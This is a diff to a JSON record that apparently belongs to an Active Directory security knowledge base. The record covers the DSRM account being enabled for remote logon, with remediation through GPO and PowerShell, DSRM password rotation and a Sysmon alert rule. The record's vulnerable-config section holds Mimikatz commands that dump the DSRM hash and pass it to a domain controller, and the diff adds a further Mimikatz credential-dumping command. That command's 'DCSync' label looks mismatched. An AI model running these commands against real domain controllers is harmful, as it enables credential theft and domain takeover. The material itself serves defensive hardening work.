@@ -99,5 +99,11 @@
     "misconfiguration": "DsrmAdminLogonBehavior left at 2 from a previous admin action. DSRM password never rotated (same since DC promotion). No Sysmon rule monitoring Lsa registry key. MDI not deployed on DCs.",
     "vulnerable_config": "# DsrmAdminLogonBehavior = 2 (remote NTLM logon enabled for DSRM account):\n(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa').DsrmAdminLogonBehavior\n# Returns 2 = DSRM account usable for remote PtH to DC = CRITICAL\n\n# DSRM hash extractable via:\n# Invoke-Mimikatz -Command 'lsadump::sam' -ComputerName DC01\n# Then PtH: Invoke-Mimikatz -Command 'sekurlsa::pth /user:Administrator /domain:DC01 /ntlm:<dsrm-hash>'",
     "secure_config": "# Ensure DsrmAdminLogonBehavior = 0 on all DCs via GPO preferences:\n# Computer Config → Preferences → Windows Settings → Registry → New Registry Item:\n# Hive: HKEY_LOCAL_MACHINE\n# Key: SYSTEM\\CurrentControlSet\\Control\\Lsa\n# Value name: DsrmAdminLogonBehavior\n# Value type: REG_DWORD\n# Value data: 0\n\n# PowerShell (run on each DC):\nSet-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name DsrmAdminLogonBehavior -Value 0\n\n# Rotate DSRM password on all DCs:\nntdsutil 'set dsrm password' 'reset password on server DC01' quit quit\n\n# SIEM/Sysmon alert:\n# Sysmon Event 13: TargetObject contains 'DsrmAdminLogonBehavior' AND Details = 'DWORD (0x00000002)' → CRITICAL"
-  }
+  },
+  "variations": [
+    {
+      "label": "Get the DSRM (local admin) hash via DCSync",
+      "command": "lsadump::lsa /inject /name:<dc_name>$"
+    }
+  ]
 }
